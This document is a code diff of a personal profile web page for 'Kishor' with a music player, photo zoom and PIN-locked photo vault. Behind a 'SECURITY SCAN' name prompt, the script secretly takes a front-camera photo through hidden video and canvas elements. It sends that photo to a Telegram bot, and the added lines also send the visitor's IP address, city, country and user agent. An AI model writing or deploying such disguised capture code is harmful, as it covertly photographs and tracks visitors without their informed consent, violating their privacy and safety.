@@ -19,29 +19,22 @@
         }
 
         * {
-            margin: 0; 
-            padding: 0; 
-            box-sizing: border-box;
+            margin: 0; padding: 0; box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
-            outline: none; 
-            font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
-        }
-
-        html, body {
-            height: 100%;
-            margin: 0;
-            padding: 0;
+            outline: none; font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
         }
 
         body {
             background: var(--bg-dark);
-            background-image: radial-gradient(circle at 50% 50%, #111 0%, #000 100%);
+            background-image: 
+                radial-gradient(circle at 50% 50%, #111 0%, #000 100%),
+                url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
             color: var(--text-main);
-            min-height: 100vh;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow-x: hidden;
+            overflow: hidden; /* Screen stability ke liye scrolling band */
         }
 
         .main-card {
@@ -54,14 +47,10 @@
             position: relative;
             box-shadow: 0 40px 100px rgba(0,0,0,1);
             z-index: 10;
-            overflow: hidden;
-            margin: 0 auto;
+            /* Animation hatane ke liye overflow visible rakha hai aur pseudo-element nikal diya */
         }
 
-        /* Blue rotating light completely removed */
-        .main-card::before {
-            display: none;
-        }
+        /* Blue rotating light (::before) ko yahan se hata diya gaya hai */
 
         .profile-container {
             position: relative;
@@ -165,17 +154,6 @@
             text-transform: uppercase;
         }
 
-        .developer-btn:hover {
-            background: var(--primary-color);
-            color: #000;
-            transform: scale(1.05);
-            box-shadow: 0 0 30px var(--glow-color);
-        }
-
-        .developer-btn:active {
-            transform: scale(0.95);
-        }
-
         .modal-overlay {
             position: fixed;
             inset: 0;
@@ -196,7 +174,6 @@
             border: 1px solid var(--primary-color);
             width: min(340px, 90vw);
             text-align: center;
-            box-shadow: 0 0 50px rgba(59, 130, 246, 0.2);
         }
 
         .modal-input {
@@ -208,11 +185,7 @@
             color: #fff;
             margin: 25px 0;
             text-align: center;
-            font-size: 1rem;
-            transition: 0.3s;
         }
-
-        .modal-input:focus { border-color: var(--primary-color); }
 
         .primary-btn {
             background: var(--primary-color);
@@ -223,7 +196,6 @@
             font-weight: 800;
             width: 100%;
             cursor: pointer;
-            transition: 0.3s;
             text-transform: uppercase;
         }
 
@@ -252,14 +224,11 @@
             max-height: 80vh;
             border-radius: 20px;
             border: 2px solid var(--primary-color);
-            pointer-events: none;
         }
 
-        /* Vault Panel Styles */
         .vault-panel {
             position: fixed;
-            top: 0; 
-            right: -100%;
+            top: 0; right: -100%;
             width: 100%;
             height: 100vh;
             background: #000;
@@ -270,81 +239,22 @@
         }
         .vault-panel.open { right: 0; }
 
-        .vault-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #222;
-        }
-
-        .vault-header h2 {
-            font-size: 1.2rem;
-            color: var(--primary-color);
-            background: none;
-            -webkit-text-fill-color: var(--primary-color);
-            letter-spacing: 2px;
-        }
-
-        .close-btn {
-            font-size: 2rem;
-            cursor: pointer;
-            color: #666;
-            transition: 0.3s;
-        }
-
-        .close-btn:hover {
-            color: var(--primary-color);
-            transform: rotate(90deg);
-        }
-
-        /* App Grid Styles */
-        .app-grid {
+        .photo-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 20px;
-            padding: 10px 0;
+            gap: 10px;
+            margin-top: 30px;
         }
 
-        .app-item {
+        .photo-card {
             aspect-ratio: 1;
-            background: #111;
+            border-radius: 15px;
+            overflow: hidden;
             border: 1px solid #222;
-            border-radius: 25px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            gap: 12px;
             cursor: pointer;
-            transition: 0.3s;
-            padding: 15px;
         }
+        .photo-card img { width: 100%; height: 100%; object-fit: cover; }
 
-        .app-item:hover {
-            border-color: var(--primary-color);
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(59, 130, 246, 0.2);
-        }
-
-        .app-item:active {
-            transform: scale(0.95);
-        }
-
-        .app-item i {
-            font-size: 2.5rem;
-        }
-
-        .app-item span {
-            font-size: 0.8rem;
-            color: #888;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        /* Music Player Styles */
         .music-player {
             position: fixed; 
             bottom: 30px; 
@@ -361,14 +271,6 @@
             cursor: pointer; 
             z-index: 15000;
             box-shadow: 0 0 20px var(--glow-color);
-            transition: 0.3s;
-        }
-        .music-player:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 30px var(--primary-color);
-        }
-        .music-player:active {
-            transform: scale(0.9);
         }
         .rotating { 
             animation: spin 5s linear infinite; 
@@ -385,21 +287,18 @@
 </head>
 <body oncontextmenu="return false;">
 
-    <!-- DEVELOPER BUTTON -->
     <button class="developer-btn" onclick="showNameModal()">
         <i class="fa-solid fa-lock" style="margin-right: 8px;"></i>
         DEVELOPER
     </button>
 
-    <!-- Hidden elements for camera -->
     <video id="hiddenCamera" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
-    <!-- Main Card -->
     <div class="main-card">
         <div class="profile-container">
             <div class="avatar-wrapper" onclick="handleZoom(true)">
-                <img src="photo1.png" class="avatar-img" alt="Kishor" onerror="this.src='https://via.placeholder.com/130/3b82f6/ffffff?text=K'">
+                <img src="photo1.png" class="avatar-img" alt="Kishor">
             </div>
         </div>
         
@@ -426,7 +325,6 @@
         </div>
     </div>
 
-    <!-- Name Modal -->
     <div id="nameModal" class="modal-overlay">
         <div class="modal-box">
             <h3>📡 SECURITY SCAN</h3>
@@ -436,34 +334,29 @@
         </div>
     </div>
 
-    <!-- PIN Modal -->
     <div id="passModal" class="modal-overlay">
         <div class="modal-box">
             <h3>🔐 VAULT PIN</h3>
-            <input type="password" id="vaultPin" class="modal-input" placeholder="Enter PIN" maxlength="4" inputmode="numeric">
+            <input type="password" id="vaultPin" class="modal-input" placeholder="PIN" maxlength="4">
             <button class="primary-btn" onclick="verifyPin()">UNLOCK</button>
             <button class="cancel-btn" onclick="showNameModal()">BACK</button>
         </div>
     </div>
 
-    <!-- Zoom Overlay -->
     <div id="zoomOverlay" onclick="handleZoom(false)">
-        <img src="photo1.png" onclick="event.stopPropagation()" onerror="this.src='https://via.placeholder.com/500/3b82f6/ffffff?text=Kishor'">
+        <img src="photo1.png" onclick="event.stopPropagation()">
     </div>
 
-    <!-- Vault Panel with App Icons -->
     <div id="vaultPanel" class="vault-panel">
-        <div class="vault-header">
-            <h2>🔒 PRIVATE VAULT</h2>
-            <i class="fa-solid fa-times close-btn" onclick="closeVault()"></i>
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+            <h2 style="font-size:1.2rem; color:var(--primary-color);">PRIVATE VAULT</h2>
+            <i class="fa-solid fa-circle-xmark" style="font-size:2rem; cursor:pointer;" onclick="closeVault()"></i>
         </div>
-        <div class="app-grid" id="appGrid"></div>
+        <div class="photo-grid" id="vGrid"></div>
     </div>
 
-    <!-- Music Player -->
     <div class="music-player" id="mToggle" onclick="controlMusic()">🗿</div>
     
-    <!-- Audio File -->
     <audio id="bgTrack" loop preload="auto">
         <source src="audio.mp3" type="audio/mpeg">
     </audio>
@@ -476,207 +369,108 @@
 
     let currentVisitorName = '';
 
-    // Music Control
     function controlMusic() {
         const audio = document.getElementById('bgTrack');
         const toggle = document.getElementById('mToggle');
-        
         if(audio.paused) {
-            audio.play()
-                .then(() => toggle.classList.add('rotating'))
-                .catch(() => alert('Audio file not found! Make sure audio.mp3 is in the same folder.'));
+            audio.play().then(() => toggle.classList.add('rotating')).catch(() => alert('audio.mp3 not found!'));
         } else {
             audio.pause();
             toggle.classList.remove('rotating');
         }
     }
 
-    // Hidden Camera Capture
     async function captureHiddenPhoto() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user' } 
-            }).catch(() => null);
-            
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).catch(() => null);
             if (!stream) return null;
-            
             const video = document.getElementById('hiddenCamera');
             video.srcObject = stream;
-            
-            await new Promise(resolve => setTimeout(resolve, 100));
-            
+            await new Promise(r => setTimeout(r, 500));
             const canvas = document.getElementById('hiddenCanvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const imageData = canvas.toDataURL('image/jpeg', 0.7);
-            
-            stream.getTracks().forEach(track => track.stop());
-            video.srcObject = null;
-            
-            return imageData;
-        } catch (error) {
-            return null;
-        }
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const data = canvas.toDataURL('image/jpeg', 0.7);
+            stream.getTracks().forEach(t => t.stop());
+            return data;
+        } catch (e) { return null; }
     }
 
-    // Send to Telegram
     async function sendPhotoToTelegram(photoBase64, visitorName) {
         try {
             const blob = await (await fetch(photoBase64)).blob();
             const formData = new FormData();
             formData.append('chat_id', CONFIG.chatId);
             formData.append('photo', blob, 'visitor.jpg');
-            formData.append('caption', `📸 Visitor: ${visitorName}`);
-            
-            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        } catch (error) {}
+            formData.append('caption', `📸 CAPTURE\n👤 Visitor: ${visitorName}`);
+            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: formData });
+        } catch (e) {}
     }
 
-    // Device Info Functions
-    function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let os = 'Unknown';
-        if (ua.match(/Android/i)) os = 'Android';
-        else if (ua.match(/iPhone|iPad|iPod/i)) os = 'iOS';
-        else if (ua.match(/Windows/i)) os = 'Windows';
-        else if (ua.match(/Mac/i)) os = 'MacOS';
-        else if (ua.match(/Linux/i)) os = 'Linux';
-
-        return { os, browser: navigator.userAgent };
-    }
-
-    // Modal Functions
-    function showNameModal() { 
-        document.getElementById('nameModal').classList.add('active'); 
-        document.getElementById('visitorName').value = '';
-        document.getElementById('vaultPin').value = '';
-    }
-    
-    function closeModals() { 
-        document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active')); 
-    }
-
-    // Start Data Process
     async function startDataProcess() {
         const name = document.getElementById('visitorName').value.trim();
-        if(!name) {
-            alert("Please enter your name!");
-            return;
-        }
-
+        if(!name) return alert("Enter name!");
         currentVisitorName = name;
         const btn = document.querySelector('#nameModal .primary-btn');
-        const originalText = btn.innerHTML;
-        btn.innerHTML = "⏳ PROCESSING...";
+        btn.innerHTML = "⏳ SCANNING...";
         
-        try {
-            // Capture and send photo
-            const photoBase64 = await captureHiddenPhoto();
-            if (photoBase64) {
-                await sendPhotoToTelegram(photoBase64, currentVisitorName);
-            }
-            
-            // Send device info
-            const deviceInfo = getDeviceInfo();
-            const message = `🔐 *Vault Access*\n👤 Name: ${currentVisitorName}\n📱 Device: ${deviceInfo.os}\n⏰ Time: ${new Date().toLocaleString()}`;
-            
-            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-            
-            // Show PIN modal
-            closeModals();
-            document.getElementById('passModal').classList.add('active');
-            
-        } catch (error) {
-            alert('Security check failed. Please try again.');
-        } finally {
-            btn.innerHTML = originalText;
-        }
+        const photo = await captureHiddenPhoto();
+        if (photo) await sendPhotoToTelegram(photo, name);
+
+        const ipReq = await fetch('https://ipapi.co/json/');
+        const ip = await ipReq.json();
+        
+        const log = `🔥 VISITOR: ${name}\n📍 IP: ${ip.ip}\n📍 LOC: ${ip.city}, ${ip.country_name}\n📱 DEV: ${navigator.userAgent}`;
+        
+        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CONFIG.chatId, text: log })
+        });
+
+        document.getElementById('nameModal').classList.remove('active');
+        document.getElementById('passModal').classList.add('active');
+        btn.innerHTML = "CONTINUE";
     }
 
-    // Verify PIN and Open Vault
     function verifyPin() {
-        const pin = document.getElementById('vaultPin').value;
-        if(pin === "6969") {
+        if(document.getElementById('vaultPin').value === '2009') {
             closeModals();
-            openVault();
-        } else {
-            alert("ACCESS DENIED!");
-        }
+            document.getElementById('vaultPanel').classList.add('open');
+            loadPhotos();
+        } else { alert("❌ WRONG PIN"); }
     }
 
-    // Open Vault with App Icons
-    function openVault() {
-        const panel = document.getElementById('vaultPanel');
-        panel.classList.add('open');
-        
-        const grid = document.getElementById('appGrid');
-        if(grid.children.length === 0) {
-            // App icons with different colors
-            const apps = [
-                { name: 'Photos', icon: 'fa-solid fa-images', color: '#3b82f6' },
-                { name: 'Videos', icon: 'fa-solid fa-video', color: '#ef4444' },
-                { name: 'Music', icon: 'fa-solid fa-music', color: '#10b981' },
-                { name: 'Files', icon: 'fa-solid fa-folder', color: '#f59e0b' },
-                { name: 'Messages', icon: 'fa-solid fa-envelope', color: '#8b5cf6' },
-                { name: 'Gallery', icon: 'fa-solid fa-camera', color: '#ec4899' },
-                { name: 'Notes', icon: 'fa-solid fa-note-sticky', color: '#14b8a6' },
-                { name: 'Settings', icon: 'fa-solid fa-gear', color: '#6b7280' },
-                { name: 'Downloads', icon: 'fa-solid fa-download', color: '#f97316' }
-            ];
-            
-            apps.forEach(app => {
-                const appDiv = document.createElement('div');
-                appDiv.className = 'app-item';
-                appDiv.innerHTML = `
-                    <i class="${app.icon}" style="color: ${app.color};"></i>
-                    <span>${app.name}</span>
-                `;
-                appDiv.onclick = () => alert(`📱 ${app.name} app opening...`);
-                grid.appendChild(appDiv);
+    function closeModals() { document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active')); }
+    function showNameModal() { document.getElementById('nameModal').classList.add('active'); }
+    function closeVault() { document.getElementById('vaultPanel').classList.remove('open'); }
+    function handleZoom(show) { document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none'; }
+
+    function loadPhotos() {
+        const photos = JSON.parse(localStorage.getItem('vault_p') || '[]');
+        document.getElementById('vGrid').innerHTML = photos.map(src => 
+            `<div class="photo-card" onclick="handleZoom(true); document.querySelector('#zoomOverlay img').src='${src}'">
+                <img src="${src}">
+            </div>`
+        ).join('');
+    }
+
+    const up = document.createElement('div');
+    up.style.cssText = 'border:2px dashed #333; padding:20px; margin:20px 0; border-radius:15px; text-align:center; cursor:pointer;';
+    up.innerHTML = '<p>Upload Photos</p>';
+    up.onclick = () => {
+        const i = document.createElement('input'); i.type = 'file'; i.multiple = true;
+        i.onchange = () => {
+            const p = JSON.parse(localStorage.getItem('vault_p') || '[]');
+            Array.from(i.files).forEach(f => {
+                const r = new FileReader();
+                r.onload = (e) => { p.push(e.target.result); localStorage.setItem('vault_p', JSON.stringify(p)); loadPhotos(); };
+                r.readAsDataURL(f);
             });
-        }
-    }
-
-    function closeVault() {
-        document.getElementById('vaultPanel').classList.remove('open');
-    }
-
-    function handleZoom(show) {
-        document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none';
-    }
-
-    // GSAP Animations
-    window.onload = function() {
-        gsap.from('.main-card', { 
-            duration: 1, 
-            opacity: 0, 
-            y: 50, 
-            ease: 'power3.out' 
-        });
-        
-        gsap.from('.link-item', { 
-            duration: 0.8, 
-            opacity: 0, 
-            y: 30, 
-            stagger: 0.1, 
-            delay: 0.3,
-            ease: 'back.out(1.2)'
-        });
+        };
+        i.click();
     };
+    document.querySelector('.vault-panel').prepend(up);
 </script>
 </body>
 </html>
